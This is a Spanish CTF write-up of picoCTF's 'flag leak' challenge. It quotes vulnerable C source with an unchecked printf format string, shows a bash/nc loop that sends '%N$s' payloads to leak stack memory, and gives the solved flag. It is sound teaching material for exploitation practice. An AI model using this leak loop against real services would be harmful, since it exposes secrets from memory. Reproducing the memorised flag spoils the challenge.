## Objetivo
Story telling class 1/2I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/91/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/91/vuln.c). And connect with it using:`nc saturn.picoctf.net 52848`
## Solución
```bash
kali@KaliEND:~/Downloads/PicoCTF/act_24/bufferoverflow0$ cd ..  
kali@KaliEND:~/Downloads/PicoCTF/act_24$ mkdir flagleak  
kali@KaliEND:~/Downloads/PicoCTF/act_24$ cd flagleak/  
kali@KaliEND:~/Downloads/PicoCTF/act_24/flagleak$ wget https://artifacts.picoctf.net/c/91/vuln  
--2024-11-12 22:39:09--  https://artifacts.picoctf.net/c/91/vuln  
Resolviendo artifacts.picoctf.net (artifacts.picoctf.net)... 2600:9000:25ed:6600:16:5ec5:2840:93a1, 2600:9000:25ed:8600:16:5ec5:28  
40:93a1, 2600:9000:25ed:1800:16:5ec5:2840:93a1, ...  
Conectando con artifacts.picoctf.net (artifacts.picoctf.net)[2600:9000:25ed:6600:16:5ec5:2840:93a1]:443... conectado.  
Petición HTTP enviada, esperando respuesta... 200 OK  
Longitud: 15876 (16K) [application/octet-stream]  
Grabando a: «vuln»  
  
vuln                             100%[========================================================>]  15,50K  --.-KB/s    en 0,002s     
  
2024-11-12 22:39:10 (6,51 MB/s) - «vuln» guardado [15876/15876]  
  
kali@KaliEND:~/Downloads/PicoCTF/act_24/flagleak$ wget https://artifacts.picoctf.net/c/91/vuln.c  
--2024-11-12 22:39:16--  https://artifacts.picoctf.net/c/91/vuln.c  
Resolviendo artifacts.picoctf.net (artifacts.picoctf.net)... 2600:9000:25ed:8800:16:5ec5:2840:93a1, 2600:9000:25ed:e200:16:5ec5:28  
40:93a1, 2600:9000:25ed:3e00:16:5ec5:2840:93a1, ...  
Conectando con artifacts.picoctf.net (artifacts.picoctf.net)[2600:9000:25ed:8800:16:5ec5:2840:93a1]:443... conectado.  
Petición HTTP enviada, esperando respuesta... 200 OK  
Longitud: 947 [application/octet-stream]  
Grabando a: «vuln.c»  
  
vuln.c                           100%[========================================================>]     947  --.-KB/s    en 0,01s      
  
2024-11-12 22:39:16 (79,1 KB/s) - «vuln.c» guardado [947/947]  
  
kali@KaliEND:~/Downloads/PicoCTF/act_24/flagleak$ ls  
vuln  vuln.c  
kali@KaliEND:~/Downloads/PicoCTF/act_24/flagleak$ cat vuln.c  
#include <stdio.h>  
#include <stdlib.h>  
#include <string.h>  
#include <unistd.h>  
#include <sys/types.h>  
#include <wchar.h>  
#include <locale.h>  
  
#define BUFSIZE 64  
#define FLAGSIZE 64  
  
void readflag(char* buf, size_t len) {  
 FILE *f = fopen("flag.txt","r");  
 if (f == NULL) {  
   printf("%s %s", "Please create 'flag.txt' in this directory with your",  
                   "own debugging flag.\n");  
   exit(0);  
 }  
  
 fgets(buf,len,f); // size bound read  
}  
  
void vuln(){  
  char flag[BUFSIZE];  
  char story[128];  
  
  readflag(flag, FLAGSIZE);  
  
  printf("Tell me a story and then I'll tell you one >> ");  
  scanf("%127s", story);  
  printf("Here's a story - \n");  
  printf(story);  
  printf("\n");  
}  
  
int main(int argc, char **argv){  
  
 setvbuf(stdout, NULL, _IONBF, 0);  
    
 // Set the gid to the effective gid  
 // this prevents /bin/sh from dropping the privileges  
 gid_t gid = getegid();  
 setresgid(gid, gid, gid);  
 vuln();  
 return 0;  
}
kali@KaliEND:~/Downloads/PicoCTF/act_24/flagleak$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 52848 | grep pico; d  
one  
FLAG=picoCTF{L34k1ng_Fl4g_0ff_St4ck_  
^C
kali@KaliEND:~/Downloads/PicoCTF/act_24/flagleak$ for i in {0..999}; do echo "%$i\$s" | nc saturn.picoctf.net 52848 | grep CTF; do  
ne  
CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
```
## Notas Adicionales
el buffer es de 64 por eso hice 2 greps diferentes para obtener la flag.
`picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}`
### Referencias